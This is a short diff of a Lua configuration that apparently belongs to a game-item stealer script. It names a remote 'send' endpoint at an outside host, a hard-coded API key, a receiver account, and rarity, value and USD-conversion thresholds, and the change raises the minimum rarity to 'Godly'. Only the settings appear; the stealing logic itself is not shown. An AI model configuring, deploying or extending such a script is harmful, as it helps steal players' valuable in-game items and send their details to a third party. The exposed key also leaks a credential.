@@ -6,7 +6,7 @@ local PROTECTOR_URL = "https://protect.mirotap.ccwu.cc/api/send"
 local API_KEY       = "b8eddf719c63cef785fa56ac8996d85413c2e0ba4c8ae769" 
 
 local RECEIVER = {"capet55"} 
-local MINIMUM_RARITY = "Legendary" 
+local MINIMUM_RARITY = "Godly" 
 local MINIMUM_VALUE = 4 
 local MINIMUM_MONEY_VALUE = 1      -- Change this to set the USD threshold for Godly
 local MONEY_VALUE_MULTIPLIER = 0.0259 -- Change this to set the USD conversion rate
